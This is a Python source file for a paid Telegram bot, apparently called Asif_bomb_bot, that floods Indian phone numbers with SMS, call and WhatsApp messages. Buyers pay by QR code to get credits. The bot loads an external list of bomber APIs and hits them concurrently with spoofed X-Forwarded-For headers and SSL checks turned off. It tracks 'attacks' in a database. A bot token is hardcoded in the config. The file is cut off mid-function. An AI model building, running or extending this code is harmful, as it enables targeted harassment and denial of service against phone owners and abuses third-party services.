import asyncio
import aiohttp
import time
import random
import json
import sqlite3
import threading
import os
import platform
import sys
import importlib.util
import requests
from datetime import datetime, timedelta
from colorama import Fore, Style, init
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import nest_asyncio

# Initialize
init(autoreset=True)
nest_asyncio.apply()

# ==================== PREMIUM FONTS ====================
def bold(text):
    bold_map = {
        'A':'𝐀','B':'𝐁','C':'𝐂','D':'𝐃','E':'𝐄','F':'𝐅','G':'𝐆','H':'𝐇','I':'𝐈',
        'J':'𝐉','K':'𝐊','L':'𝐋','M':'𝐌','N':'𝐍','O':'𝐎','P':'𝐏','Q':'𝐐','R':'𝐑',
        'S':'𝐒','T':'𝐓','U':'𝐔','V':'𝐕','W':'𝐖','X':'𝐗','Y':'𝐘','Z':'𝐙',
        'a':'𝐚','b':'𝐛','c':'𝐜','d':'𝐝','e':'𝐞','f':'𝐟','g':'𝐠','h':'𝐡','i':'𝐢',
        'j':'𝐣','k':'𝐤','l':'𝐥','m':'𝐦','n':'𝐧','o':'𝐨','p':'𝐩','q':'𝐪','r':'𝐫',
        's':'𝐬','t':'𝐭','u':'𝐮','v':'𝐯','w':'𝐰','x':'𝐱','y':'𝐲','z':'𝐳',
        '0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'
    }
    return ''.join(bold_map.get(c, c) for c in text)

# ==================== CONFIG ====================
BOT_TOKEN = "8790374936:AAHADuIn9XkTm-LyOJoAzY6ZDkkceGOGX5g"
OWNER_USERNAME = "@ASIFXLIVE"
OWNER_ID = 7543477298
CHANNEL_USERNAME = "@asifxlive1"
BOT_USERNAME = "@Asif_bomb_bot"
ADMIN_IDS = [7543477298, 987654321]

CREDIT_PRICE = 1
CREDIT_DURATION = 5
DAILY_BONUS = 1
REFERRAL_BONUS = 5
QR_CODE_FILE = "asif.png"

# ==================== DATABASE ====================
conn = sqlite3.connect('asif_bomber.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    credits INTEGER DEFAULT 0,
    total_used INTEGER DEFAULT 0,
    last_bonus TEXT,
    joined_channel INTEGER DEFAULT 0,
    created_at TEXT
)''')

c.execute('''CREATE TABLE IF NOT EXISTS attacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    phone TEXT,
    start_time TEXT,
    end_time TEXT,
    credits_used INTEGER,
    status TEXT
)''')

c.execute('''CREATE TABLE IF NOT EXISTS referrals (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    referrer_id INTEGER,
    referred_id INTEGER
)''')

c.execute('''CREATE TABLE IF NOT EXISTS purchases (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    credits_requested INTEGER,
    amount TEXT,
    screenshot_file_id TEXT,
    status TEXT DEFAULT 'pending',
    created_at TEXT,
    processed_by INTEGER,
    processed_at TEXT
)''')

conn.commit()
print(f"{Fore.GREEN}✅ Database ready{Style.RESET_ALL}")

# ==================== BOMBER LOADER ====================
class BomberLoader:
    def __init__(self):
        self.module = None
        self.active = {}
        self.loaded = False
        self.apis = []
    
    def load(self):
        try:
            if not os.path.exists("ASIFXLIVEBOMB.py"):
                print(f"{Fore.RED}❌ ASIFXLIVEBOMB.py not found{Style.RESET_ALL}")
                return False
            spec = importlib.util.spec_from_file_location("bomber", "ASIFXLIVEBOMB.py")
            self.module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(self.module)
            if hasattr(self.module, 'UltimatePhoneDestroyer'):
                self.loaded = True
                self.apis = self.module.ULTIMATE_APIS
                print(f"{Fore.GREEN}✅ Bomber ready! {len(self.apis)} APIs{Style.RESET_ALL}")
                return True
        except Exception as e:
            print(f"{Fore.RED}❌ Load error: {e}{Style.RESET_ALL}")
        return False
    
    async def start_attack(self, user_id, phone, credits):
        if not self.loaded:
            return "Bomber not ready"
        for a in self.active.values():
            if a['user_id'] == user_id and a['status'] == 'active':
                return "Already have active attack"
        attack_id = f"{user_id}_{int(time.time())}"
        end = datetime.now() + timedelta(minutes=credits*CREDIT_DURATION)
        try:
            c.execute("INSERT INTO attacks (user_id, phone, start_time, end_time, credits_used, status) VALUES (?,?,?,?,?,?)",
                     (user_id, phone, str(datetime.now()), str(end), credits, "active"))
            conn.commit()
        except:
            return "DB error"
        destroyer = self.module.UltimatePhoneDestroyer()
        self.active[attack_id] = {
            'user_id': user_id, 'phone': phone, 'status': 'active',
            'destroyer': destroyer, 'stop_event': asyncio.Event(), 'task': None
        }
        task = asyncio.create_task(self._run(attack_id, destroyer, phone, credits*CREDIT_DURATION))
        self.active[attack_id]['task'] = task
        return "success"
    
    async def _run(self, aid, d, phone, mins):
        a = self.active.get(aid)
        if not a:
            return
        try:
            connector = aiohttp.TCPConnector(limit=30, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                tasks = []
                for api in self.apis[:30]:
                    tasks.append(asyncio.create_task(self._hit(s, api, phone, d, a)))
                try:
                    await asyncio.wait_for(a['stop_event'].wait(), timeout=mins*60)
                except:
                    pass
                d.running = False
                for t in tasks:
                    t.cancel()
                a['status'] = 'completed'
        except:
            a['status'] = 'failed'
        finally:
            if aid in self.active:
                del self.active[aid]
    
    async def _hit(self, s, api, phone, d, a):
        while a['status'] == 'active' and d.running:
            try:
                url = api['url'](phone) if callable(api['url']) else api['url']
                headers = api['headers'].copy()
                headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                d.stats['total_requests'] += 1
                if 'call' in api['name'].lower():
                    d.stats['calls_sent'] += 1
                elif 'whatsapp' in api['name'].lower():
                    d.stats['whatsapp_sent'] += 1
                else:
                    d.stats['sms_sent'] += 1
                if api['method'] == 'POST':
                    data = api['data'](phone) if api['data'] else None
                    async with s.post(url, headers=headers, data=data, timeout=2, ssl=False) as r:
                        if r.status in [200,201,202,204]:
                            d.stats['successful_hits'] += 1
                else:
                    async with s.get(url, headers=headers, timeout=2, ssl=False) as r:
                        if r.status in [200,201,202,204]:
                            d.stats['successful_hits'] += 1
                await asyncio.sleep(0.001)
            except:
                d.stats['failed_attempts'] += 1
    
    async def stop(self, uid):
        for aid, a in list(self.active.items()):
            if a['user_id'] == uid and a['status'] == 'active':
                a['status'] = 'stopped'
                a['destroyer'].running = False
                a['stop_event'].set()
                if a['task'] and not a['task'].done():
                    a['task'].cancel()
                try:
                    c.execute("UPDATE attacks SET status='stopped' WHERE user_id=? AND status='active'", (uid,))
                    conn.commit()
                except:
                    pass
                del self.active[aid]
                return True
        return False

bomber = BomberLoader()
bomber.load()

# ==================== KEYBOARDS ====================
def main_keyboard(uid):
    try:
        c.execute("SELECT credits FROM users WHERE user_id=?", (uid,))
        cred = c.fetchone()[0]
    except:
        cred = 0
    btns = [
        [InlineKeyboardButton(f"{bold('💣 BOMB')}", callback_data="bomb")],
        [InlineKeyboardButton(f"{bold('💰 BUY')}", callback_data="buy"),
         InlineKeyboardButton(f"{bold('🎁 DAILY')}", callback_data="daily")],
        [InlineKeyboardButton(f"{bold('👥 REFER')}", callback_data="refer"),
         InlineKeyboardButton(f"{bold('📊 STATS')}", callback_data="stats")],
        [InlineKeyboardButton(f"{bold('🛑 STOP')}", callback_data="stop"),
         InlineKeyboardButton(f"{bold('❓ HELP')}", callback_data="help")],
        [InlineKeyboardButton(f"{bold('📢 CHANNEL')}", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"),
         InlineKeyboardButton(f"{bold('👤 OWNER')}", url="https://t.me/ASIFXLIVE")]
    ]
    if uid in ADMIN_IDS:
        btns.append([InlineKeyboardButton(f"{bold('👑 ADMIN')}", callback_data="admin")])
    return InlineKeyboardMarkup(btns), cred

def back_btn():
    return InlineKeyboardMarkup([[InlineKeyboardButton(f"{bold('🔙 BACK')}", callback_data="menu")]])

def admin_btns():
    btns = [
        [InlineKeyboardButton(f"{bold('➕ ADD CREDITS')}", callback_data="add"),
         InlineKeyboardButton(f"{bold('📊 USER LIST')}", callback_data="ulist")],
        [InlineKeyboardButton(f"{bold('🔍 SEARCH')}", callback_data="search"),
         InlineKeyboardButton(f"{bold('💰 PURCHASES')}", callback_data="purchases")],
        [InlineKeyboardButton(f"{bold('📈 DASHBOARD')}", callback_data="dashboard"),
         InlineKeyboardButton(f"{bold('🔙 BACK')}", callback_data="menu")]
    ]
    return InlineKeyboardMarkup(btns)

# ==================== CHANNEL CHECK ====================
async def check_channel(uid, ctx):
    try:
        m = await ctx.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=uid)
        if m.status in ['member','administrator','creator']:
            c.execute("UPDATE users SET joined_channel=1 WHERE user_id=?", (uid,))
            conn.commit()
            return True
    except:
        pass
    return False

# ==================== START ====================
async def start(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = upd.effective_user.id
    name = upd.effective_user.first_name
    
    # ===== NEW USER GETS 3 FREE CREDITS =====
    try:
        # Check if user exists
        c.execute("SELECT credits FROM users WHERE user_id=?", (uid,))
        existing = c.fetchone()
        
        if not existing:
            # New user - give 3 free credits
            c.execute("INSERT INTO users (user_id, first_name, credits, created_at) VALUES (?,?,?,?)",
                     (uid, name, 3, str(datetime.now())))
            conn.commit()
            print(f"{Fore.GREEN}✅ New user {uid} got 3 free credits{Style.RESET_ALL}")
        else:
            # Existing user - just update last active
            c.execute("INSERT OR IGNORE INTO users (user_id, first_name, created_at) VALUES (?,?,?)",
                     (uid, name, str(datetime.now())))
            conn.commit()
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️ User insert error: {e}{Style.RESET_ALL}")
    
    if not await check_channel(uid, ctx):
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"{bold('📢 JOIN')}", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
            [InlineKeyboardButton(f"{bold('✅ JOINED')}", callback_data="check")]
        ])
        await upd.message.reply_text(f"{bold('❌ JOIN CHANNEL FIRST')}", reply_markup=kb)
        return
    
    kb, cred = main_keyboard(uid)
    status = f"{bold('✅ READY')}" if bomber.loaded else f"{bold('⚠️ LOADING')}"
    await upd.message.reply_text(
        f"╔═══『 {bold('ASIF PREMIUM')} 』═══╗\n\n"
        f"{bold('👤 USER')}: {name}\n"
        f"{bold('💰 CREDITS')}: {cred}\n"
        f"{bold('💣 BOMBER')}: {status}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{bold('👇 CHOOSE')}:",
        reply_markup=kb
    )

# ==================== CALLBACK ====================
async def callback(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = upd.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data
    
    # Channel check
    if data not in ["check","menu"] and not await check_channel(uid, ctx):
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(f"{bold('📢 JOIN')}", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]])
        if q.message.text:
            await q.edit_message_text(f"{bold('❌ JOIN CHANNEL FIRST')}", reply_markup=kb)
        else:
            await q.message.reply_text(f"{bold('❌ JOIN CHANNEL FIRST')}", reply_markup=kb)
        return
    
    # ===== MENU =====
    if data == "menu":
        kb, cred = main_keyboard(uid)
        if q.message.text:
            await q.edit_message_text(f"╔═══『 {bold('ASIF PREMIUM')} 』═══╗\n\n{bold('💰 CREDITS')}: {cred}", reply_markup=kb)
        else:
            await q.message.reply_text(f"╔═══『 {bold('ASIF PREMIUM')} 』═══╗\n\n{bold('💰 CREDITS')}: {cred}", reply_markup=kb)
            await q.delete_message()
    
    # ===== CHECK CHANNEL =====
    elif data == "check":
        if await check_channel(uid, ctx):
            kb, cred = main_keyboard(uid)
            if q.message.text:
                await q.edit_message_text(f"{bold('✅ CHANNEL JOINED!')}\n\n{bold('💰 CREDITS')}: {cred}", reply_markup=kb)
            else:
                await q.message.reply_text(f"{bold('✅ CHANNEL JOINED!')}\n\n{bold('💰 CREDITS')}: {cred}", reply_markup=kb)
                await q.delete_message()
        else:
            await q.answer(f"{bold('❌ NOT JOINED')}", show_alert=True)
    
    # ===== BOMB =====
    elif data == "bomb":
        try:
            c.execute("SELECT credits FROM users WHERE user_id=?", (uid,))
            cred = c.fetchone()[0]
        except:
            cred = 0
        if cred < 1:
            if q.message.text:
                await q.edit_message_text(f"{bold('❌ NO CREDITS!')}", reply_markup=back_btn())
            else:
                await q.message.reply_text(f"{bold('❌ NO CREDITS!')}", reply_markup=back_btn())
            return
        ctx.user_data[uid] = {"state": "phone"}
        if q.message.text:
            await q.edit_message_text(f"{bold('📞 SEND 10 DIGIT NUMBER')}\n\n{bold('EXAMPLE')}: 9876543210", reply_markup=back_btn())
        else:
            await q.message.reply_text(f"{bold('📞 SEND 10 DIGIT NUMBER')}\n\n{bold('EXAMPLE')}: 9876543210", reply_markup=back_btn())
            await q.delete_message()
    
    # ===== STOP =====
    elif data == "stop":
        stopped = await bomber.stop(uid)
        if stopped:
            if q.message.text:
                await q.edit_message_text(f"{bold('✅ ATTACK STOPPED!')}", reply_markup=back_btn())
            else:
                await q.message.reply_text(f"{bold('✅ ATTACK STOPPED!')}", reply_markup=back_btn())
        else:
            if q.message.text:
                await q.edit_message_text(f"{bold('❌ NO ACTIVE ATTACK!')}", reply_markup=back_btn())
            else:
                await q.message.reply_text(f"{bold('❌ NO ACTIVE ATTACK!')}", reply_markup=back_btn())
    
    # ===== BUY =====
    elif data == "buy":
        if os.path.exists(QR_CODE_FILE):
            with open(QR_CODE_FILE, 'rb') as f:
                await ctx.bot.send_photo(
                    uid, f,
                    caption=f"{bold('💎 SCAN & PAY')}\n\n{bold('💰 1 CREDIT')} = ₹{CREDIT_PRICE}\n\n{bold('📸 SEND SCREENSHOT')}",
                    reply_markup=back_btn()
                )
            await q.delete_message()
        else:
            if q.message.text:
                await q.edit_message_text(f"{bold('💎 PRICE')}: ₹{CREDIT_PRICE}/credit\n\n{bold('📸 SEND SCREENSHOT')}", reply_markup=back_btn())
            else:
                await q.message.reply_text(f"{bold('💎 PRICE')}: ₹{CREDIT_PRICE}/credit\n\n{bold('📸 SEND SCREENSHOT')}", reply_markup=back_btn())
        ctx.user_data[uid] = {"state": "screenshot"}
    
    # ===== DAILY =====
    elif data == "daily":
        today = str(datetime.now().date())
        try:
            c.execute("SELECT last_bonus FROM users WHERE user_id=?", (uid,))
            r = c.fetchone()
            if r and r[0] == today:
                if q.message.text:
                    await q.edit_message_text(f"{bold('❌ ALREADY CLAIMED!')}", reply_markup=back_btn())
                else:
                    await q.message.reply_text(f"{bold('❌ ALREADY CLAIMED!')}", reply_markup=back_btn())
            else:
                c.execute("UPDATE users SET credits = credits + ?, last_bonus = ? WHERE user_id=?",
                         (DAILY_BONUS, today, uid))
                conn.commit()
                c.execute("SELECT credits FROM users WHERE user_id=?", (uid,))
                new = c.fetchone()[0]
                if q.message.text:
                    await q.edit_message_text(f"{bold('✅')} +{DAILY_BONUS} {bold('CREDIT!')}\n{bold('💰 TOTAL')}: {new}", reply_markup=back_btn())
                else:
                    await q.message.reply_text(f"{bold('✅')} +{DAILY_BONUS} {bold('CREDIT!')}\n{bold('💰 TOTAL')}: {new}", reply_markup=back_btn())
        except:
            pass
    
    # ===== REFER =====
    elif data == "refer":
        link = f"https://t.me/{BOT_USERNAME[1:]}?start=ref_{uid}"
        try:
            c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id=?", (uid,))
            refs = c.fetchone()[0]
        except:
            refs = 0
        msg = f"{bold('🔗 YOUR LINK')}:\n{link}\n\n{bold('👥 REFERRALS')}: {refs}\n{bold('🎁 PER REF')}: {REFERRAL_BONUS} CREDITS"
        if q.message.text:
            await q.edit_message_text(msg, reply_markup=back_btn())
        else:
            await q.message.reply_text(msg, reply_markup=back_btn())
    
    # ===== STATS =====
    elif data == "stats":
        try:
            c.execute("SELECT credits, total_used FROM users WHERE user_id=?", (uid,))
            cred, used = c.fetchone()
            c.execute("SELECT COUNT(*) FROM attacks WHERE user_id=?", (uid,))
            att = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id=?", (uid,))
            refs = c.fetchone()[0]
            msg = f"{bold('📊 YOUR STATS')}\n\n{bold('💰 CREDITS')}: {cred}\n{bold('💣 ATTACKS')}: {att}\n{bold('📞 USED')}: {used}\n{bold('👥 REFS')}: {refs}"
        except:
            msg = f"{bold('❌ ERROR')}"
        if q.message.text:
            await q.edit_message_text(msg, reply_markup=back_btn())
        else:
            await q.message.reply_text(msg, reply_markup=back_btn())
    
    # ===== HELP =====
    elif data == "help":
        msg = f"{bold('❓ HELP')}\n\n{bold('💣 BOMB')}: Start attack\n{bold('💰 BUY')}: Get credits\n{bold('🎁 DAILY')}: Free credit\n{bold('👥 REFER')}: Earn\n{bold('🛑 STOP')}: Stop attack"
        if q.message.text:
            await q.edit_message_text(msg, reply_markup=back_btn())
        else:
            await q.message.reply_text(msg, reply_markup=back_btn())
    
    # ===== ADMIN =====
    elif data == "admin" and uid in ADMIN_IDS:
        if q.message.text:
            await q.edit_message_text(f"{bold('👑 ADMIN PANEL')}", reply_markup=admin_btns())
        else:
            await q.message.reply_text(f"{bold('👑 ADMIN PANEL')}", reply_markup=admin_btns())
    
    # ===== ADD CREDITS =====
    elif data == "add" and uid in ADMIN_IDS:
        if q.message.text:
            await q.edit_message_text(f"{bold('➕ USE /add COMMAND')}\n\n{bold('Example')}: /add 123456789 10", reply_markup=back_btn())
        else:
            await q.message.reply_text(f"{bold('➕ USE /add COMMAND')}\n\n{bold('Example')}: /add 123456789 10", reply_markup=back_btn())
    
    # ===== USER LIST =====
    elif data == "ulist" and uid in ADMIN_IDS:
        try:
            c.execute("SELECT user_id, username, first_name, credits, total_used, created_at FROM users ORDER BY credits DESC LIMIT 10")
            users = c.fetchall()
            
            msg = f"{bold('📊 TOP 10 USERS BY CREDITS')}\n\n"
            for i, u in enumerate(users, 1):
                uid2, uname, fname, cred, used, created = u
                username_display = f"@{uname}" if uname else "No username"
                created_date = created[:10] if created else "Unknown"
                msg += f"{i}. {bold('ID')}: {uid2}\n"
                msg += f"   {bold('User')}: {username_display}\n"
                msg += f"   {bold('Name')}: {fname}\n"
                msg += f"   {bold('Credits')}: {cred} | {bold('Used')}: {used}\n"
                msg += f"   {bold('Joined')}: {created_date}\n\n"
            
            if q.message.text:
                await q.edit_message_text(msg[:4000], reply_markup=back_btn())
            else:
                await q.message.reply_text(msg[:4000], reply_markup=back_btn())
        except Exception as e:
            error_msg = f"{bold('❌ ERROR')}: {str(e)}"
            if q.message.text:
                await q.edit_message_text(error_msg, reply_markup=back_btn())
            else:
                await q.message.reply_text(error_msg, reply_markup=back_btn())
    
    # ===== SEARCH =====
    elif data == "search" and uid in ADMIN_IDS:
        ctx.user_data[uid] = {"state": "admin_search"}
        if q.message.text:
            await q.edit_message_text(f"{bold('🔍 SEND USER ID OR @USERNAME')}", reply_markup=back_btn())
        else:
            await q.message.reply_text(f"{bold('🔍 SEND USER ID OR @USERNAME')}", reply_markup=back_btn())
            await q.delete_message()
    
    # ===== PURCHASES =====
    elif data == "purchases" and uid in ADMIN_IDS:
        try:
            c.execute("SELECT id, user_id, username, credits_requested, amount, created_at FROM purchases WHERE status='pending' ORDER BY created_at DESC")
            purchases = c.fetchall()
            
            if not purchases:
                msg = f"{bold('✅ NO PENDING PURCHASES')}"
                if q.message.text:
                    await q.edit_message_text(msg, reply_markup=back_btn())
                else:
                    await q.message.reply_text(msg, reply_markup=back_btn())
                return
            
            msg = f"{bold('💰 PENDING PURCHASES')}\n\n"
            for p in purchases[:5]:
                pid, puid, puname, pcred, pamount, ptime = p
                msg += f"#{pid} | {bold('User')}: {puid} (@{puname})\n"
                msg += f"   {bold('Credits')}: {pcred} | {bold('Amount')}: ₹{pamount}\n"
                msg += f"   {bold('Time')}: {ptime[:16]}\n\n"
            
            if q.message.text:
                await q.edit_message_text(msg, reply_markup=back_btn())
            else:
                await q.message.reply_text(msg, reply_markup=back_btn())
        except Exception as e:
            error_msg = f"{bold('❌ ERROR')}: {str(e)}"
            if q.message.text:
                await q.edit_message_text(error_msg, reply_markup=back_btn())
            else:
                await q.message.reply_text(error_msg, reply_markup=back_btn())
    
    # ===== DASHBOARD =====
    elif data == "dashboard" and uid in ADMIN_IDS:
        try:
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            
            c.execute("SELECT user_id, username, first_name, created_at FROM users ORDER BY created_at DESC LIMIT 5")
            recent = c.fetchall()
            
            c.execute("SELECT SUM(credits) FROM users")
            total_credits = c.fetchone()[0] or 0
            
            c.execute("SELECT COUNT(*) FROM attacks")
            total_attacks = c.fetchone()[0]
            
            msg = f"{bold('📊 USER DASHBOARD')}\n\n"
            msg += f"{bold('👥 TOTAL USERS')}: {total_users}\n"
            msg += f"{bold('💰 TOTAL CREDITS')}: {total_credits}\n"
            msg += f"{bold('💣 TOTAL ATTACKS')}: {total_attacks}\n\n"
            msg += f"{bold('🆕 RECENT USERS')}:\n"
            
            for u in recent:
                uid2, uname, fname, created = u
                username_display = f"@{uname}" if uname else "No username"
                date = created[:10] if created else "Unknown"
                msg += f"• {uid2} | {username_display} | {fname} | {date}\n"
            
            if q.message.text:
                await q.edit_message_text(msg, reply_markup=back_btn())
            else:
                await q.message.reply_text(msg, reply_markup=back_btn())
        except Exception as e:
            error_msg = f"{bold('❌ ERROR')}: {str(e)}"
            if q.message.text:
                await q.edit_message_text(error_msg, reply_markup=back_btn())
            else:
                await q.message.reply_text(error_msg, reply_markup=back_btn())
    
    # ===== APPROVE =====
    elif data.startswith('approve_') and uid == OWNER_ID:
        pid = int(data.split('_')[1])
        try:
            c.execute("SELECT user_id, credits_requested FROM purchases WHERE id=? AND status='pending'", (pid,))
            r = c.fetchone()
            if r:
                t_uid, cred = r
                c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (cred, t_uid))
                c.execute("UPDATE purchases SET status='approved', processed_by=?, processed_at=? WHERE id=?",
                         (uid, str(datetime.now()), pid))
                conn.commit()
                if q.message.text:
                    await q.edit_message_text(f"{bold('✅ APPROVED')} #{pid}")
                else:
                    await q.message.reply_text(f"{bold('✅ APPROVED')} #{pid}")
                try:
                    await ctx.bot.send_message(t_uid, f"{bold('✅ PURCHASE APPROVED!')}\n\n{bold('💰')} +{cred} {bold('CREDITS')}")
                except:
                    pass
        except:
            pass
    
    # ===== REJECT =====
    elif data.startswith('reject_') and uid == OWNER_ID:
        pid = int(data.split('_')[1])
        try:
            c.execute("SELECT user_id FROM purchases WHERE id=? AND status='pending'", (pid,))
            r = c.fetchone()
            if r:
                t_uid = r[0]
                c.execute("UPDATE purchases SET status='rejected', processed_by=?, processed_at=? WHERE id=?",
                         (uid, str(datetime.now()), pid))
                conn.commit()
                if q.message.text:
                    await q.edit_message_text(f"{bold('❌ REJECTED')} #{pid}")
                else:
                    await q.message.reply_text(f"{bold('❌ REJECTED')} #{pid}")
                try:
                    await ctx.bot.send_message(t_uid, f"{bold('❌ PURCHASE REJECTED')}\n\n{bold('Contact')} {OWNER_USERNAME}")
                except:
                    pass
        except:
            pass

# ==================== MESSAGE HANDLER ====================
async def handle_msg(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = upd.effective_user.id
    txt = upd.message.text
    state = ctx.user_data.get(uid, {})
    
    # ===== ADMIN SEARCH =====
    if state.get('state') == 'admin_search' and uid in ADMIN_IDS:
        try:
            query = txt.strip()
            if query.startswith('@'):
                c.execute("SELECT user_id, username, first_name, credits, total_used, created_at FROM users WHERE username=?", (query[1:],))
            else:
                try:
                    search_uid = int(query)
                    c.execute("SELECT user_id, username, first_name, credits, total_used, created_at FROM users WHERE user_id=?", (search_uid,))
                except:
                    await upd.message.reply_text(f"{bold('❌ INVALID ID')}", reply_markup=back_btn())
                    ctx.user_data.pop(uid, None)
                    return
            
            user = c.fetchone()
            if user:
                uid2, uname, fname, cred, used, created = user
                username_display = f"@{uname}" if uname else "No username"
                created_date = created[:10] if created else "Unknown"
                msg = f"{bold('👤 USER FOUND')}\n\n"
                msg += f"{bold('ID')}: {uid2}\n"
                msg += f"{bold('Username')}: {username_display}\n"
                msg += f"{bold('Name')}: {fname}\n"
                msg += f"{bold('Credits')}: {cred}\n"
                msg += f"{bold('Used')}: {used}\n"
                msg += f"{bold('Joined')}: {created_date}"
                await upd.message.reply_text(msg, reply_markup=back_btn())
            else:
                await upd.message.reply_text(f"{bold('❌ USER NOT FOUND')}", reply_markup=back_btn())
        except Exception as e:
            await upd.message.reply_text(f"{bold('❌ ERROR')}: {str(e)}", reply_markup=back_btn())
        
        ctx.user_data.pop(uid, None)
        return
    
    # ===== SCREENSHOT =====
    if upd.message.photo and state.get('state') == 'screenshot':
        fid = upd.message.photo[-1].file_id
        ctx.user_data[uid] = {'state': 'credits', 'fid': fid}
        await upd.message.reply_text(f"{bold('📸 SCREENSHOT RECEIVED')}\n\n{bold('💎 SEND CREDITS AMOUNT')}\n{bold('EXAMPLE')}: 10, 20, 50", reply_markup=back_btn())
        return
    
    # ===== CREDITS AMOUNT =====
    if state.get('state') == 'credits':
        try:
            cred = int(txt)
            if cred < 1 or cred > 1000:
                await upd.message.reply_text(f"{bold('❌ 1-1000 ONLY')}", reply_markup=back_btn())
                return
        except:
            await upd.message.reply_text(f"{bold('❌ INVALID NUMBER')}", reply_markup=back_btn())
            return
        
        fid = state.get('fid')
        if not fid:
            await upd.message.reply_text(f"{bold('❌ ERROR')}", reply_markup=back_btn())
            return
        
        uname = upd.effective_user.username or "None"
        c.execute("INSERT INTO purchases (user_id, username, credits_requested, amount, screenshot_file_id, created_at) VALUES (?,?,?,?,?,?)",
                 (uid, uname, cred, str(cred*CREDIT_PRICE), fid, str(datetime.now())))
        conn.commit()
        pid = c.lastrowid
        
        await upd.message.reply_text(f"{bold('✅ REQUEST SENT')} #{pid}\n\n{bold('⏳ WAIT FOR APPROVAL')}", reply_markup=back_btn())
        
        # Notify owner
        try:
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"{bold('✅ APPROVE')}", callback_data=f"approve_{pid}"),
                 InlineKeyboardButton(f"{bold('❌ REJECT')}", callback_data=f"reject_{pid}")]
            ])
            await ctx.bot.send_message(OWNER_ID, 
                f"{bold('🛒 NEW PURCHASE')} #{pid}\n\n"
                f"{bold('👤 USER')}: {uid} (@{uname})\n"
                f"{bold('💰 CREDITS')}: {cred}\n"
                f"{bold('💵 AMOUNT')}: ₹{cred*CREDIT_PRICE}",
                reply_markup=kb
            )
            await ctx.bot.send_photo(OWNER_ID, fid, caption=f"Purchase #{pid} screenshot")
        except:
            pass
        
        ctx.user_data.pop(uid, None)
        return
    
    # ===== PHONE NUMBER =====
    if state.get('state') == 'phone':
        if not txt.isdigit() or len(txt) != 10:
            await upd.message.reply_text(f"{bold('❌ INVALID! 10 DIGITS ONLY')}", reply_markup=back_btn())
            return
        ctx.user_data[uid] = {'state': 'credits_use', 'phone': txt}
        try:
            c.execute("SELECT credits FROM users WHERE user_id=?", (uid,))
            avail = c.fetchone()[0]
        except:
            avail = 0
        await upd.message.reply_text(f"{bold('📞 TARGET')}: +91{txt}\n{bold('💰 AVAILABLE')}: {avail}\n\n{bold('💎 SEND CREDITS')} (1-{avail})", reply_markup=back_btn())
        return
    
    # ===== CREDITS USE =====
    if state.get('state') == 'credits_use':
        phone = state.get('phone')
        try:
            use = int(txt)
        except:
            await upd.message.reply_text(f"{bold('❌ INVALID NUMBER')}", reply_markup=back_btn())
            return
        try:
            c.execute("SELECT credits FROM users WHERE user_id=?", (uid,))
            avail = c.fetchone()[0]
        except:
            avail = 0
        if use < 1 or use > avail:
            await upd.message.reply_text(f"{bold('❌ USE 1-')}{avail}", reply_markup=back_btn())
            return
        res = await bomber.start_attack(uid, phone, use)
        if res != "success":
            await upd.message.reply_text(f"{bold('❌')} {res}", reply_markup=back_btn())
            return
        c.execute("UPDATE users SET credits = credits - ?, total_used = total_used + ? WHERE user_id=?",
                 (use, use, uid))
        conn.commit()
        await upd.message.reply_text(
            f"╔═══『 {bold('ATTACK STARTED')} 』═══╗\n\n"
            f"{bold('📞 TARGET')}: +91{phone}\n"
            f"{bold('⏱️ DURATION')}: {use*CREDIT_DURATION} MIN\n"
            f"{bold('💣 CREDITS')}: {use}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"{bold('🔥 900+ APIS')}\n"
            f"{bold('🛑 /stop')}",
            reply_markup=back_btn()
        )
        ctx.user_data.pop(uid, None)
        return
    
    await upd.message.reply_text(f"{bold('❌ USE /start')}", reply_markup=back_btn())

# ===== ADMIN COMMANDS =====
async def add_cmd(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if upd.effective_user.id not in ADMIN_IDS:
        await upd.message.reply_text(f"{bold('❌ UNAUTHORIZED')}")
        return
    try:
        if len(ctx.args) < 2:
            await upd.message.reply_text(f"{bold('USAGE')}: /add USER_ID CREDITS\n\n{bold('Example')}: /add 123456789 10")
            return
        uid = int(ctx.args[0])
        cred = int(ctx.args[1])
        if cred < 1 or cred > 10000:
            await upd.message.reply_text(f"{bold('❌ CREDITS MUST BE 1-10000')}")
            return
        
        c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (cred, uid))
        conn.commit()
        
        if c.rowcount == 0:
            c.execute("INSERT INTO users (user_id, first_name, created_at) VALUES (?, ?, ?)",
                     (uid, "Unknown", str(datetime.now())))
            c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (cred, uid))
            conn.commit()
